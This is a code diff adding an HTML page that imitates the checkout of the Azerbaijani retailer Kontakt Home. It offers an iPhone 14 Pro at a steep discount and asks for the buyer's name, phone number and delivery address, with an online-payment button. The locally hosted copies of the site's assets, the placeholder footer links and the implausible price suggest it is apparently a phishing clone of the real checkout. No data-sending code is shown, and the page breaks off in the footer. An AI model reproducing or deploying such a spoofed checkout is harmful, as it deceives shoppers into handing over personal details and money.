@@ -1,0 +1,801 @@
+<!DOCTYPE html><html lang="az"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="title" content="Sifarişin rəsmiləşdirilməsi">
+    <meta name="description" content="Kontakt Home">
+    <meta name="keywords" content="Kontakt Home">
+    <meta name="robots" content="INDEX,FOLLOW">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <title>Sifarişin rəsmiləşdirilməsi</title>
+
+
+    <style data-tippy-stylesheet="">
+        .tippy-box[data-animation=fade][data-state=hidden] {
+            opacity: 0
+        }
+
+        [data-tippy-root] {
+            max-width: calc(100vw - 10px)
+        }
+
+        .tippy-box {
+            position: relative;
+            background-color: #333;
+            color: #fff;
+            border-radius: 4px;
+            font-size: 14px;
+            line-height: 1.4;
+            outline: 0;
+            transition-property: transform, visibility, opacity
+        }
+
+        .tippy-box[data-placement^=top]>.tippy-arrow {
+            bottom: 0
+        }
+
+        .tippy-box[data-placement^=top]>.tippy-arrow:before {
+            bottom: -7px;
+            left: 0;
+            border-width: 8px 8px 0;
+            border-top-color: initial;
+            transform-origin: center top
+        }
+
+        .tippy-box[data-placement^=bottom]>.tippy-arrow {
+            top: 0
+        }
+
+        .tippy-box[data-placement^=bottom]>.tippy-arrow:before {
+            top: -7px;
+            left: 0;
+            border-width: 0 8px 8px;
+            border-bottom-color: initial;
+            transform-origin: center bottom
+        }
+
+        .tippy-box[data-placement^=left]>.tippy-arrow {
+            right: 0
+        }
+
+        .tippy-box[data-placement^=left]>.tippy-arrow:before {
+            border-width: 8px 0 8px 8px;
+            border-left-color: initial;
+            right: -7px;
+            transform-origin: center left
+        }
+
+        .tippy-box[data-placement^=right]>.tippy-arrow {
+            left: 0
+        }
+
+        .tippy-box[data-placement^=right]>.tippy-arrow:before {
+            left: -7px;
+            border-width: 8px 8px 8px 0;
+            border-right-color: initial;
+            transform-origin: center right
+        }
+
+        .tippy-box[data-inertia][data-state=visible] {
+            transition-timing-function: cubic-bezier(.54, 1.5, .38, 1.11)
+        }
+
+        .tippy-arrow {
+            width: 16px;
+            height: 16px;
+            color: #333
+        }
+
+        .tippy-arrow:before {
+            content: "";
+            position: absolute;
+            border-color: transparent;
+            border-style: solid
+        }
+
+        .tippy-content {
+            position: relative;
+            padding: 5px 9px;
+            z-index: 1
+        }
+    </style>
+    <link rel="stylesheet" type="text/css" media="all" href="css/calendar.css">
+    <link rel="stylesheet" type="text/css" media="all" href="css/address-validation.css">
+    <link rel="stylesheet" type="text/css" media="all" href="css/styles.css">
+    <link rel="stylesheet" type="text/css" href="css/monseratt.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/checkout-fields.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/checkout-registration.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/delivery-date.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/orderattachment.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/subscription.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/magento-giftoptions.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/magento-storepickup.css">
+    <link rel="stylesheet" type="text/css" media="screen, print" href="css/firecheckout-light.css">
+
+    <link rel="canonical" href="https://kontakt.az/checkout">
+    <link rel="alternate" hreflang="az-Latn-AZ" href="https://kontakt.az/checkout">
+    <link rel="alternate" hreflang="ru-RU" href="https://kontakt.az/ru/checkout">
+    <link rel="icon" type="image/x-icon" href="images/FAVICON_64_png.png">
+    <link rel="shortcut icon" type="image/x-icon" href="images/FAVICON_64_png.png">
+
+    <script src="https://unpkg.com/imask"></script>
+
+
+
+
+    <style>
+        .cms-promo .content--other1 .cont>.container .products-grid div[data-element=inner] .contentos .prodItem__top {
+            position: relative !important;
+        }
+
+        .cms-promo .content--other1 .cont>.container .products-grid div[data-element=inner] .contentos .label-image-wrapper .prodItem__top {
+            position: absolute !important;
+        }
+
+        .catalog-category-view .column.main {
+            min-height: auto;
+        }
+
+        .catalog-product-view .bottom-label-container .prodItem__top .product-modal-wrapper.active .modal-main {
+            height: calc(100% - 135px);
+        }
+
+        .prodItem.product-item.product-item_small {
+            .prodItem__img {
+                .product-image {
+                    width: 100% !important;
+                    height: 100% !important;
+                }
+            }
+        }
+
+        .catalog-product-view .calc-button.calc-button-payment {
+            display: none;
+        }
+
+        .catalog-product_compare-index .compareContent .srItemSide__wr {
+            overflow: hidden;
+            overflow-x: auto;
+        }
+
+        @media (min-width: 768px) {
+            .header-top-link-menu .navigations {
+                gap: 1rem;
+            }
+        }
+    </style>
+
+    <link rel="stylesheet" type="text/css" media="all" href="css/default.css">
+    <link rel="stylesheet" type="text/css" media="all" onload="media='all'" href="css/deferred-default.css">
+    <link rel="stylesheet" type="text/css" media="all" href="css/checkout.css">
+    <link rel="stylesheet" type="text/css" media="all" onload="media='all'" href="css/deferred-checkout.css">
+    <link rel="stylesheet" type="text/css" media="all" href="css/font-awesome.min.css">
+
+</head>
+
+<body class="firecheckout checkout-index-index fc-form-compact fc-theme-light fc-form-hide-labels fc-form-tooltips firecheckout-col1-set expanded fc-onestep breeze-theme firecheckout-layout-full firecheckout-index-index page-layout-1column webp fc-step-payment fc-step-shipping equal-billing-shipping has-countdown" id="html-body">
+
+    <noscript>
+        <div class="message global noscript">
+            <div class="content">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong>
+                    <span>
+                        For the best experience on our site, be sure to turn on Javascript in your browser. </span>
+                </p>
+            </div>
+        </div>
+    </noscript>
+
+    <div class="wrapper">
+        <header class="header">
+            <div class="header__top">
+                <style>
+                    #html-body [data-pb-style=BB71II3] {
+                        justify-content: flex-start;
+                        display: flex;
+                        flex-direction: column;
+                        background-position: left top;
+                        background-size: cover;
+                        background-repeat: no-repeat;
+                        background-attachment: scroll
+                    }
+                </style>
+                <div data-content-type="row" data-appearance="contained" data-element="main">
+                    <div data-enable-parallax="0" data-parallax-speed="0.5" data-background-images="{}" data-background-type="image" data-video-loop="true" data-video-play-only-visible="true" data-video-lazy-load="true" data-video-fallback-src="" data-element="inner" data-pb-style="BB71II3">
+                        <div class="banner-top-container" data-content-type="html" data-appearance="default" data-element="main" data-decoded="true">
+                            <a href="https://kontakt.az/furset-ayagina-geldi" target="_blank">
+                                <div id="countdown-timer-widget" class="countdown-timer-widget active" data-url="https://kontakt.az/countdown/timer/info/">
+                                    <style type="text/css">
+                                        .countdown-timer-widget {
+                                            background: #000000;
+                                            background-image: url("images/mobazefurset1.png");
+                                        }
+
+                                        @media all and (min-width: 768px) {
+                                            .countdown-timer-widget {
+                                                background-image: url("images/topbanerPCAZ55.png");
+                                            }
+                                        }
+                                    </style>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="container justify-content-between items-center">
+                    <link rel="preload" fetchpriority="high" as="image" href="https://kontakt.az/" type="image/svg+xml">
+                    <div class="col logo-wrapper">
+                        <a class="logo" href="https://kontakt.az/" title="" aria-label="store logo">
+                            <img src="images/logo.svg" title="" alt="" loading="eager">
+                        </a>
+                    </div>
+
+                    <style>
+                        .logo-wrapper {
+                            flex-basis: unset;
+                            max-width: unset;
+                            margin-right: 0;
+                        }
+
+                        .logo-wrapper .logo {
+                            align-items: center;
+                            display: flex;
+                            width: auto;
+                            max-width: 155px;
+                        }
+                    </style>
+
+                </div>
+            </div>
+        </header>
+
+
+        <main id="maincontent" class="content content--other1 content--other11">
+            <div id="contentarea"></div>
+            <section class="cartContent cartContent--mb0">
+                <div class="cartContent__cont cartContent__cont--checkout">
+                    <div class="container">
+                        <div id="checkout" class="container checkout-main">
+                            <div class="container first-load-container">
+                                <div class="messages"></div>
+                                <div id="checkoutSteps" class="container__elem container__elem--11">
+                                    <div class="cartContent__top">
+                                        <div class="cartContent__vnut1 cartContent__vnut1--fix">Sifarişin
+                                            rəsmiləşdirilməsi</div>
+                                    </div>
+                                    <div class="cartContent__personalDannie">
+                                        <div id="shipping" class="checkout-shipping-address">
+                                            <div class="dannie__title">
+                                                <span data-role="title">Şəxsi məlumat</span>
+                                            </div>
+                                            <div id="checkout-step-shipping" class="step-content">
+                                                <form class="form form-shipping-address fc-size-l" id="co-shipping-form">
+                                                    <div id="shipping-new-address-form" class="fieldset address">
+
+                                                        <div class="field _required" name="shippingAddress.firstname">
+                                                            <label class="label" for="name">
+                                                                <span>Ad</span>
+                                                            </label>
+                                                            <div class="control">
+                                                                <input class="input-text" type="text" name="firstname" placeholder="Adını yaz" aria-required="true" aria-invalid="false" id="name">
+                                                            </div>
+                                                        </div>
+
+                                                        <div class="field _required" name="shippingAddress.lastname">
+                                                            <label class="label" for="lastname">
+                                                                <span>Soyad</span>
+                                                            </label>
+                                                            <div class="control">
+                                                                <input class="input-text" type="text" name="lastname" placeholder="Soyadını yaz" aria-required="true" aria-invalid="false" id="lastname">
+                                                            </div>
+                                                        </div>
+
+                                                        <div class="field _required fc-dirty" name="shippingAddress.telephone">
+                                                            <label class="label" for="phone">
+                                                                <span>Nömrə</span>
+                                                            </label>
+                                                            <div class="control">
+                                                                <input class="admin__control-text" placeholder="+994 (##) ###-##-##" type="phone" name="telephone" id="phone" maxlength="20">
+                                                            </div>
+                                                        </div>
+
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <div id="opc-shipping_method" class="checkout-shipping-method cartContent__tabezz">
+                                        <div class="checkout-shipping-method">
+
+                                            <div class="tables__tabs">
+                                                <div class="tables__tab js-tab active">
+                                                    <span>Çatdırılma ünvanı</span>
+                                                </div>
+                                            </div>
+
+                                            <div class="field _required fc-dirty" name="shippingAddress.city">
+                                                <label class="label" for="city">
+                                                    <span>Şəhər</span>
+                                                </label>
+                                                <div class="control">
+                                                    <select class="select" name="city" id="city" a="">
+                                                        <option value="">--Siyahıdan seç--</option>
+                                                        <option value="1">Bakı | Баку</option>
+                                                        <option value="2">Gəncə | Гянджа</option>
+                                                        <option value="3">Naxçıvan | Нахичевань</option>
+                                                        <option value="4">Abşeron | Абшерон</option>
+                                                        <option value="5">Sumqayıt | Сумгаит</option>
+                                                        <option value="7">Astara | Астара
+                                                        </option>
+                                                        <option data-title="Ağcəbədi | Агджабеди" value="8">Ağcəbədi |
+                                                            Агджабеди</option>
+                                                        <option data-title="Ağdam | Агдам" value="9">Ağdam | Агдам
+                                                        </option>
+                                                        <option data-title="Ağdaş | Агдаш" value="10">Ağdaş | Агдаш
+                                                        </option>
+                                                        <option data-title="Ağstafa | Агстафа" value="11">Ağstafa |
+                                                            Агстафа</option>
+                                                        <option data-title="Ağsu | Агсу" value="12">Ağsu | Агсу</option>
+                                                        <option data-title="Balakən | Балакан" value="13">Balakən |
+                                                            Балакан</option>
+                                                        <option data-title="Beyləqan | Бейлаган" value="14">Beyləqan |
+                                                            Бейлаган</option>
+                                                        <option data-title="Biləsuvar | Билясувар" value="15">Biləsuvar
+                                                            | Билясувар</option>
+                                                        <option data-title="Bərdə | Барда" value="16">Bərdə | Барда
+                                                        </option>
+                                                        <option data-title="Cəlilabad | Джалилабад" value="17">Cəlilabad
+                                                            | Джалилабад</option>
+                                                        <option data-title="Fizuli | Физули" value="18">Fizuli | Физули
+                                                        </option>
+                                                        <option data-title="Dəşkəsən | Дашкесан" value="19">Dəşkəsən |
+                                                            Дашкесан</option>
+                                                        <option data-title="Goranboy | Геранбой" value="20">Goranboy |
+                                                            Геранбой</option>
+                                                        <option data-title="Göygöl | Гёйгёль" value="21">Göygöl |
+                                                            Гёйгёль</option>
+                                                        <option data-title="Göycay | Гейчай" value="22">Göycay | Гейчай
+                                                        </option>
+                                                        <option data-title="Gədəbəy  | Гедабек" value="23">Gədəbəy |
+                                                            Гедабек</option>
+                                                        <option data-title="Hacıqabul | Гаджигабул" value="24">Hacıqabul
+                                                            | Гаджигабул</option>
+                                                        <option data-title="Kürdəmir | Кюрдамир" value="25">Kürdəmir |
+                                                            Кюрдамир</option>
+                                                        <option data-title="Lerik | Лерик" value="26">Lerik | Лерик
+                                                        </option>
+                                                        <option data-title="Lənkəran | Ленкорань" value="27">Lənkəran |
+                                                            Ленкорань</option>
+                                                        <option data-title="Masallı | Масаллы" value="28">Masallı |
+                                                            Масаллы</option>
+                                                        <option data-title="Mingəçevir | Мингячевир" value="29">
+                                                            Mingəçevir | Мингячевир</option>
+                                                        <option data-title="Naftalan  | Нафталан" value="30">Naftalan |
+                                                            Нафталан</option>
+                                                        <option data-title="Neftçala | Нефтчала" value="31">Neftçala |
+                                                            Нефтчала</option>
+                                                        <option data-title="Qax | Гах" value="32">Qax | Гах</option>
+                                                        <option data-title="Qazax  | Газах" value="33">Qazax | Газах
+                                                        </option>
+                                                        <option data-title="Qobustan | Гобустан" value="34">Qobustan |
+                                                            Гобустан</option>
+                                                        <option data-title="Quba | Губа" value="35">Quba | Губа</option>
+                                                        <option data-title="Qusar | Гусар" value="36">Qusar | Гусар
+                                                        </option>
+                                                        <option data-title="Qəbələ | Габала" value="37">Qəbələ | Габала
+                                                        </option>
+                                                        <option data-title="Saatlı | Саатлы" value="38">Saatlı | Саатлы
+                                                        </option>
+                                                        <option data-title="Sabirabad | Сабирабад" value="39">Sabirabad
+                                                            | Сабирабад</option>
+                                                        <option data-title="Salyan | Сальян" value="40">Salyan | Сальян
+                                                        </option>
+                                                        <option data-title="Samux | Самух" value="41">Samux | Самух
+                                                        </option>
+                                                        <option data-title="Sizəyən | Сиазань" value="42">Sizəyən |
+                                                            Сиазань</option>
+                                                        <option data-title="Tovuz | Товуз" value="43">Tovuz | Товуз
+                                                        </option>
+                                                        <option data-title="Tərtər | Тертер" value="44">Tərtər | Тертер
+                                                        </option>
+                                                        <option data-title="Ucar | Уджар" value="45">Ucar | Уджар
+                                                        </option>
+                                                        <option data-title="Xacmaz | Хачмаз" value="46">Xacmaz | Хачмаз
+                                                        </option>
+                                                        <option data-title="Xızı | Хызы" value="47">Xızı | Хызы</option>
+                                                        <option data-title="Yardımlı | Ярдымлы" value="48">Yardımlı |
+                                                            Ярдымлы</option>
+                                                        <option data-title="Yevlax | Евлах" value="49">Yevlax | Евлах
+                                                        </option>
+                                                        <option data-title="Zakatala | Закатала" value="50">Zakatala |
+                                                            Закатала</option>
+                                                        <option data-title="Zərdab | Зердаб" value="51">Zərdab | Зердаб
+                                                        </option>
+                                                        <option data-title="İmişli  | Имишли" value="52">İmişli | Имишли
+                                                        </option>
+                                                        <option data-title="İsmayıllı | Исмаиллы" value="53">İsmayıllı |
+                                                            Исмаиллы</option>
+                                                        <option data-title="Şabran | Шабран" value="54">Şabran | Шабран
+                                                        </option>
+                                                        <option data-title="Şamaxı | Шамаха" value="55">Şamaxı | Шамаха
+                                                        </option>
+                                                        <option data-title="Şirvan | Ширван" value="56">Şirvan | Ширван
+                                                        </option>
+                                                        <option data-title="Şəki | Шеки" value="57">Şəki | Шеки</option>
+                                                        <option data-title="Şəmkir | Шамкир" value="58">Şəmkir | Шамкир
+                                                        </option>
+                                                        <option data-title="Tbilisi | Тбилиси" value="59">Tbilisi |
+                                                            Тбилиси</option>
+                                                    </select>
+                                                </div>
+                                            </div>
+
+                                            <div class="field _required" name="shippingAddress.street.0">
+                                                <label class="label" for="address">
+                                                    <span>Ünvan</span>
+                                                </label>
+                                                <div class="control">
+                                                    <input class="input-text" type="text" name="street[0]" placeholder="Ünvanını qeyd et" id="address">
+                                                </div>
+                                            </div>
+
+                                            <div class="field" name="shippingAddress.custom_attributes.additional_description">
+                                                <label class="label" for="HRH3T91">
+                                                    <span>Əlavə qeyd:</span>
+                                                </label>
+                                                <div class="control">
+                                                    <input class="input-text" type="text" name="custom_attributes[additional_description]" id="HRH3T91">
+                                                </div>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                    <div id="payment" role="presentation" class="checkout-payment-method personalInfo__Def">
+                                        <div class="dannie__title">
+                                            <span>Payment Information</span>
+                                        </div>
+                                        <div id="checkout-step-payment" class="step-content" role="tabpanel" aria-hidden="false">
+                                            <form id="co-payment-form" class="form payments" novalidate="novalidate">
+                                                <fieldset class="fieldset">
+                                                    <br>
+                                                    <div></div>
+                                                    <hr>
+                                                    <div id="checkout-payment-method-load" class="opc-payment">
+                                                        <div class="items payment-methods">
+                                                            <div class="payment-group" data-repeat-index="0">
+                                                                <div class="step-title">Ödəniş Üsulu
+                                                                </div>
+                                                                <div class="payment-method _active">
+                                                                    <div class="payment-method-title field choice fc-dirty">
+                                                                        <input type="radio" class="radio" id="pashabank">
+                                                                        <label class="label" for="pashabank">
+                                                                            <span>Saytda onlayn ödəniş</span>
+                                                                        </label>
+                                                                    </div>
+                                                                    <div class="payment-method-content">
+                                                                        <div class="actions-toolbar">
+                                                                            <div class="primary">
+                                                                                <button class="action primary checkout" id="complete1" type="button">
+                                                                                    <span>Sifarişi tamamla</span>
+                                                                                </button>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </fieldset>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="container__elem container__elem--4">
+                                    <div id="opc-sidebar" class="oformlenieWrap">
+                                        <div class="oformlenie">
+                                            <div class="oformlenie__top active">
+                                                <div class="oformlenie__top1">
+                                                    <strong>Məhsul</strong>
+                                                    <div>
+                                                        <span>1</span>
+                                                        <span>Ədəd</span>
+                                                    </div>
+                                                </div>
+
+                                                <div class="oformlenie__top2">
+                                                    <img id="phone-image" src="images/new_project_-_2023-08-17t171327.378.png" width="50" height="50">
+                                                    <div>
+                                                        <span>iPhone 14 Pro 256 GB</span>
+                                                        <span id="phone-color">Deep Purple</span>
+
+                                                        <div class="sidebar-qty">
+                                                            <span>(1</span><span>ədəd</span>)
+                                                        </div>
+                                                    </div>
+                                                    <div class="details-qty">
+                                                        <div class="subtotal">
+                                                            <span class="price-excluding-tax">
+                                                                <div class="oformlenie__price cart-price">
+                                                                    <strong>
+                                                                        <i>1,499.99�₼</i>
+                                                                        <b>999.99�₼</b>
+                                                                    </strong>
+                                                                </div>
+                                                            </span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                            </div>
+                                            <div class="oformlenie__bottom">
+                                                <div class="oformlenie__bottom1">
+                                                    <div class="oformlenie__bottom1wr">
+                                                        <span scope="row">Umumi məbləğ:</span>
+                                                        <i>1,499.99�₼</i>
+                                                    </div>
+                                                    <div class="oformlenie__bottom1wr">
+                                                        <span>Endirim:</span>
+                                                        <em>500.00�₼</em>
+                                                    </div>
+
+                                                    <hr>
+
+                                                    <div class="oformlenie__bottom1wr">
+                                                        <span scope="row">Yekun məbləğ:</span>
+                                                        <i>999.99�₼</i>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+                                            <div class="oformlenieBut">
+                                                <button type="button" class="oform" id="complete3">Sifarişi
+                                                    tamamla</button>
+                                                <span class="info-block">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                                        <path d="M12.0016 2C17.5253 2 22.0031 6.47785 22.0031 12.0016C22.0031 17.5253 17.5253 22.0031 12.0016 22.0031C6.47785 22.0031 2 17.5253 2 12.0016C2 6.47785 6.47785 2 12.0016 2ZM12.0016 3.5C7.30627 3.5 3.5 7.30627 3.5 12.0016C3.5 16.6968 7.30627 20.5031 12.0016 20.5031C16.6968 20.5031 20.5031 16.6968 20.5031 12.0016C20.5031 7.30627 16.6968 3.5 12.0016 3.5ZM11.9979 10.5006C12.3776 10.5003 12.6916 10.7823 12.7415 11.1483L12.7484 11.2501L12.752 16.7517C12.7523 17.1659 12.4167 17.5019 12.0025 17.5022C11.6228 17.5024 11.3088 17.2205 11.2589 16.8544L11.252 16.7527L11.2484 11.2511C11.2481 10.8369 11.5837 10.5009 11.9979 10.5006ZM12.002 7.00282C12.5535 7.00282 13.0007 7.44993 13.0007 8.00148C13.0007 8.55303 12.5535 9.00014 12.002 9.00014C11.4505 9.00014 11.0033 8.55303 11.0033 8.00148C11.0033 7.44993 11.4505 7.00282 12.002 7.00282Z" fill="#777777"></path>
+                                                    </svg>
+                                                    <span>Sifarişi təstiq edərkən,</span>
+                                                    <a href="https://kontakt.az/saytin-istifade-sertleri">şərtlər</a>
+                                                    <span>qəbul edirəm</span>
+                                                </span>
+                                            </div>
+
+                                            <div class="botton-fixed-block">
+                                                <div class="top-content">
+                                                    <span class="text-block">Ödəniləcəkməbləğ:</span>
+                                                    <span class="price-block">
+                                                        <span class="current">999.99�₼</span>
+                                                        <span class="old">1,499.99�₼</span>
+                                                    </span>
+                                                </div>
+
+                                                <div class="action-block">
+                                                    <span class="action-text" id="complete2">Sifarişin
+                                                        rəsmiləşdirilməsi</span>
+                                                    <span class="info-block">
+                                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                                            <path d="M12.0016 2C17.5253 2 22.0031 6.47785 22.0031 12.0016C22.0031 17.5253 17.5253 22.0031 12.0016 22.0031C6.47785 22.0031 2 17.5253 2 12.0016C2 6.47785 6.47785 2 12.0016 2ZM12.0016 3.5C7.30627 3.5 3.5 7.30627 3.5 12.0016C3.5 16.6968 7.30627 20.5031 12.0016 20.5031C16.6968 20.5031 20.5031 16.6968 20.5031 12.0016C20.5031 7.30627 16.6968 3.5 12.0016 3.5ZM11.9979 10.5006C12.3776 10.5003 12.6916 10.7823 12.7415 11.1483L12.7484 11.2501L12.752 16.7517C12.7523 17.1659 12.4167 17.5019 12.0025 17.5022C11.6228 17.5024 11.3088 17.2205 11.2589 16.8544L11.252 16.7527L11.2484 11.2511C11.2481 10.8369 11.5837 10.5009 11.9979 10.5006ZM12.002 7.00282C12.5535 7.00282 13.0007 7.44993 13.0007 8.00148C13.0007 8.55303 12.5535 9.00014 12.002 9.00014C11.4505 9.00014 11.0033 8.55303 11.0033 8.00148C11.0033 7.44993 11.4505 7.00282 12.002 7.00282Z" fill="#777777"></path>
+                                                        </svg>
+                                                        <span>Sifarişi təstiq edərkən,</span>
+                                                        <a href="https://kontakt.az/konfidensialliq-siyaseti">şərtlər</a>
+                                                        <span>qəbul edirəm</span>
+                                                    </span>
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                        <div class="opc-block-shipping-information">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+
+
+
+        <footer class="foot show">
+            <div class="foot__top">
+                <div class="container">
+                    <style>
+                        #html-body [data-pb-style=Y1RD37X] {
+                            display: none
+                        }
+                    </style>
+                    <div class="container__elem container__elem--11 container__elem--df">
+                        <div class="footItem footItem--1">
+                            <div class="footItem__title">Kонтакты</div>
+                            <div class="footItem__text">Мы на карте</div>
+                            <div class="footItem__wr">
+                                <span>
+                                    <svg width="36" height="12" viewBox="0 0 36 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M33.333 11.8268L32.9955 10.0871H29.2245L28.6245 11.8144L25.602 11.8206C27.0409 8.25331 28.4829 4.68733 29.928 1.12268C30.174 0.518041 30.6105 0.21031 31.254 0.213403C31.746 0.218042 32.5485 0.218041 33.663 0.214948L36 11.8222L33.333 11.8268ZM30.0735 7.70412H32.5035L31.596 3.3433L30.0735 7.70412ZM10.59 0.211856L13.629 0.214948L8.931 11.8284L5.8545 11.8253C5.08087 8.75771 4.31687 5.68759 3.5625 2.61495C3.4125 2.00258 3.1155 1.57423 2.544 1.37165C1.69984 1.08004 0.851754 0.800629 0 0.533506L0 0.216495H4.8555C5.6955 0.216495 6.186 0.635567 6.3435 1.49536C6.5025 2.3567 6.9015 4.54948 7.5435 8.07371L10.59 0.211856ZM17.805 0.214948L15.402 11.8253L12.51 11.8222L14.91 0.211856L17.805 0.214948V0.214948ZM23.67 0C24.5355 0 25.626 0.278351 26.253 0.533506L25.746 2.94124C25.179 2.70619 24.246 2.38918 23.4615 2.4C22.3215 2.4201 21.6165 2.9134 21.6165 3.3866C21.6165 4.1567 22.8405 4.54484 24.1005 5.38608C25.539 6.34484 25.728 7.20619 25.71 8.14175C25.6905 10.084 24.1005 12 20.7465 12C19.2165 11.9768 18.6645 11.8438 17.4165 11.3876L17.9445 8.87474C19.215 9.42371 19.7535 9.59845 20.8395 9.59845C21.834 9.59845 22.6875 9.18402 22.695 8.46186C22.701 7.94845 22.395 7.6933 21.279 7.05928C20.163 6.42371 18.597 5.54381 18.618 3.77783C18.6435 1.51701 20.721 0 23.6715 0H23.67Z" fill="#323232"></path>
+                                    </svg>
+                                </span>
+                                <span>
+                                    <svg width="30" height="18" viewBox="0 0 30 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M14.9995 1.87205C16.0791 2.71945 16.9517 3.80132 17.5514 5.03579C18.1511 6.27026 18.4621 7.62497 18.4609 8.99738C18.4617 10.3694 18.1505 11.7235 17.5508 12.9575C16.9512 14.1915 16.0787 15.2729 14.9995 16.1201C13.9201 15.2728 13.0476 14.1911 12.4479 12.9569C11.8483 11.7227 11.5372 10.3682 11.5382 8.99605C11.5372 7.62386 11.8483 6.26941 12.4479 5.03519C13.0476 3.80097 13.9201 2.71931 14.9995 1.87205V1.87205ZM13.8395 1.09605C12.6968 2.07148 11.7795 3.28341 11.151 4.64809C10.5226 6.01276 10.1979 7.49762 10.1995 9.00005C10.198 10.5018 10.5224 11.986 11.1504 13.3502C11.7784 14.7144 12.6949 15.926 13.8369 16.9014C12.4574 17.6758 10.8992 18.0756 9.3173 18.0612C7.73538 18.0468 6.18479 17.6186 4.81965 16.8192C3.45451 16.0198 2.32238 14.877 1.53579 13.5044C0.749193 12.1318 0.335537 10.5773 0.335938 8.9953C0.336338 7.41332 0.750781 5.85899 1.53807 4.48682C2.32536 3.11465 3.45807 1.97243 4.82361 1.1737C6.18915 0.374971 7.73996 -0.052448 9.32189 -0.0660701C10.9038 -0.0796923 12.4618 0.320957 13.8408 1.09605H13.8395ZM16.1622 16.9014C17.3041 15.926 18.2207 14.7144 18.8487 13.3502C19.4767 11.986 19.8011 10.5018 19.7995 9.00005C19.8011 7.49762 19.4765 6.01276 18.848 4.64809C18.2195 3.28341 17.3022 2.07148 16.1595 1.09605C17.5386 0.320957 19.0966 -0.0796923 20.6785 -0.0660701C22.2604 -0.052448 23.8112 0.374971 25.1768 1.1737C26.5423 1.97243 27.675 3.11465 28.4623 4.48682C29.2496 5.85899 29.664 7.41332 29.6644 8.9953C29.6648 10.5773 29.2512 12.1318 28.4646 13.5044C27.678 14.877 26.5459 16.0198 25.1807 16.8192C23.8156 17.6186 22.265 18.0468 20.6831 18.0612C19.1011 18.0756 17.543 17.6758 16.1635 16.9014H16.1622Z" fill="#323232"></path>
+                                    </svg>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="footItem footItem--2">
+                            <div class="footItem__title">Компания</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/">О Компании</a></li>
+                                <li><a href="https://kontakt.az/">Новости компании</a></li>
+                                <li><a href="https://kontakt.az/">Наши магазины</a></li>
+                                <li><a href="https://kontakt.az/">Сервисы</a></li>
+                                <li><a href="https://kontakt.az/">Вакансии</a></li>
+                                <li><a href="https://kontakt.az/">Политика конфиденциальности</a></li>
+                            </ul>
+                        </div>
+                        <div class="footItem footItem--2">
+                            <div class="footItem__title">Информация</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/">Вопросы и ответы</a></li>
+                                <li><a href="https://kontakt.az/">Условия использования сайта</a></li>
+                                <li><a href="https://kontakt.az/">Kontakt TV</a></li>
+                                <li><a href="https://kontakt.az/">Вопросы и ответы</a></li>
+                                <li><a href="https://kontakt.az/">Вопросы и ответы</a></li>
+                            </ul>
+                        </div>
+                        <div class="footItem footItem--3">
+                            <div class="footItem__title">Для Клиентов</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/">Доставка и оплата</a></li>
+                                <li><a href="https://kontakt.az/">Политика возврата</a></li>
+                                <li><a href="https://kontakt.az/">Гарантия</a></li>
+                                <li><a href="https://kontakt.az/">Условия оплаты в рассрочку</a></li>
+                                <li><a href="https://kontakt.az/">Способы осуществления ежемесячных платежей</a></li>
+                                <li><a href="https://kontakt.az/">Корпоративные продажи</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="container__elem container__elem--11 container__elem--df" data-content-type="html" data-appearance="default" data-element="main" data-decoded="true">
+                        <div class="footItem footItem--1">
+                            <div class="footItem__title">Əlaqə</div>
+                            <div class="footItem__text">
+                                <a href="https://kontakt.az/magazalar">Biz xəritədə</a>
+                            </div>
+                            <div class="footItem__wr">
+                                <span>
+                                    <svg width="36" height="12" viewBox="0 0 36 12" fill="none" xmlns="http://www.w3.org/2000/svg">
